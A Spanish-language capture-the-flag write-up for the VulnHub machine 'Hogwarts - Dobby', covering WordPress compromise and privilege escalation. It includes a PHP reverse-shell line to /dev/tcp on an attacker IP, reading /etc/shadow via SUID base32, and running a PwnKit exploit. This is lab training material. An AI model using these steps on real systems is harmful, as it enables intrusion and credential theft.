---
title: Hogwarts - Dobby
date: 2024-09-08
categories: [WRITEUPS, VulnHub]
tags: []  # TAG names should always be lowercase
image: /assets/images/vulnhub/logo.png
---

Buenas, en esta máquina explotaremos un **Wordpress**, por el cual obtendremos una **Reverse Shell**, y migraremos de usuarios por el bit **SUID** de un binario, y escalaremos de privilegios por la versión anticuada de **pkexec**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos será un escaneo con *NMAP* para comprobar los puertos abiertos de la máquina.

```bash
nmap -p- --open -T5 192.168.1.167 -n -Pn -v
```

Encontramos únicamente el puerto **80 - HTTP** abierto.

![picture](/assets/images/vulnhub/hog1.png){: w="600" h="300" }

Si nos vamos al navegador, para ver que está corriendo, vemos una página por defecto de **Apache2**.

![picture](/assets/images/vulnhub/hog2.png)

Buscando en el código fuente de la página, vemos una ruta comentada.

![picture](/assets/images/vulnhub/hog3.png)

Y encontramos lo siguiente.

![picture](/assets/images/vulnhub/hog4.png)

La casa del personaje **Draco Malfoy** es **Slytherin**.

---

## **Explotación**

Realizando **Fuzzing** con **Gobuster** encontramos otras rutas.

```bash
gobuster dir -u http://192.168.1.167 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .txt,.php,.html -b 404,403 -t 200
```

![picture](/assets/images/vulnhub/hog5.png)

En el contenido de la ruta "**/log**", encontramos una contraseña, y otra ruta.

![picture](/assets/images/vulnhub/hog6.png)

Y dentro de la ruta encontrada en "**/log**", vemos un *Blog* corriendo con **Wordpress 5.5.3**.

![picture](/assets/images/vulnhub/hog7.png)

Viendo la entrada de **DOBBY**, si traducimos el texto codificado en **Brainfuck** no obtenemos nada claro.

![picture](/assets/images/vulnhub/hog8.png)

Y dentro de la web no encuentro nada más interesante, realizando **Fuzzing** sobre la la web de **Wordpress**, encuentro las rutas y archivos típicos.

![picture](/assets/images/vulnhub/hog9.png)

En el login de **wp-admin** consigo acceder al panel administrador con las credenciales de **Draco**.

![picture](/assets/images/vulnhub/hog10.png)

![picture](/assets/images/vulnhub/hog11.png)

Dentro del panel administrador, al ser la versión antigua, si nos deja editar el tema, podremos inyectar código **PHP** para obtener una **Reverse Shell** en nuestra máquina local.

Nos vamos al editor de temas, y en la cabecera del tema activo (*header.php*) le introducimos el código que nos devolverá la **Reverse Shell**.

```php
exec("bash -c 'bash -i >& /dev/tcp/192.168.1.159/4444 0>&1'");
```

![picture](/assets/images/vulnhub/hog12.png)

Y actualizamos el archivo.

Una vez hecho, crearemos un **Listener** con **ncat** en nuestra máquina local, con el puerto indicado en el código **PHP** para que nos devuelva una **Shell** interactiva.

- *Listener*
	
	```bash
	nc -nlvp 4444
	```

E introduciremos en la *URL* del navegador la ruta donde se encuentra el archivo **header.php**.

```python
http://192.168.1.167/DiagonAlley/wp-content/themes/amphibious/header.php
```

Pulsamos "*enter*", y se nos ejecutará el código.

![picture](/assets/images/vulnhub/hog13.png)

Y obtendremos una **Shell** interactiva en nuestra máquina local dentro del servidor.

![picture](/assets/images/vulnhub/hog14.png){: w="600" h="300" }

Hago un tratamiento de la *tty*, para obtener una *Shell* más limpia.

```bash
script /dev/null -qc /bin/bash
CTRL+Z
stty raw -echo; fg
ls
export SHELL=/bin/bash
export TERM=screen
stty rows 46 columns 184 ('stty size' en la máquina local)
reset
```

Encontramos el usuario **dobby**.

![picture](/assets/images/vulnhub/hog15.png)

Dentro de su carpeta personal encontramos la primera **flag**.

![picture](/assets/images/vulnhub/hog16.png)

---

## **Escalada de privilegios**

Buscando archivos con el **Bit** **SUID**, encuentro **base32**.

```bash
find / -perm -4000 -type f 2>/dev/null
```

![picture](/assets/images/vulnhub/hog17.png)

En la Web [**GTFOBins - base32**](https://gtfobins.github.io/gtfobins/base32/), encontramos como podemos leer archivos privilegiados del servidor gracias al bit **SUID** en **base32**.

Voy a leer el contenido del archivo "**/etc/shadow**" que es el que contiene las contraseñas cifradas de los usuarios del sitema.

```bash
LFILE=/etc/shadow
base32 "$LFILE" | base32 --decode
```

![picture](/assets/images/vulnhub/hog18.png)

Y en su contenido encontramos la contraseña cifrada del usuario **dobby**.

![picture](/assets/images/vulnhub/hog19.png)

A continuación, la copiaremos, y la intentaremos crackear con **JohnTheRipper** mediante fuerza bruta en nuestra máquina local.

![picture](/assets/images/vulnhub/hog20.png)

```bash
echo 'contraseña cifrada' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Y al cabo de un rato, nos encuentra la contraseña.

![picture](/assets/images/vulnhub/hog21.png){: w="600" h="300" }

Migramos de usuario a **dobby**, y obtenemos resultado.

![picture](/assets/images/vulnhub/hog22.png)

Cuando busqué los binarios con bit de **SUID**, también encontré **pkexec**, viendo ahora la versión (**0.105**) para una posible escalada de privilegios, me doy cuenta que es vulnerable a [**PwnKit - CVE-2021-4034**](https://github.com/Almorabea/pkexec-exploit).

Me descargo el script en **Python3** del repositorio de **Github**, con **wget**.

![picture](/assets/images/vulnhub/hog23.png)

Y lo ejecuto para obtener una bash como **root**.

![picture](/assets/images/vulnhub/hog24.png){: w="600" h="300" }

Y en el directorio personal encuentro la segunda **flag**.

![picture](/assets/images/vulnhub/hog25.png){: w="600" h="300" }



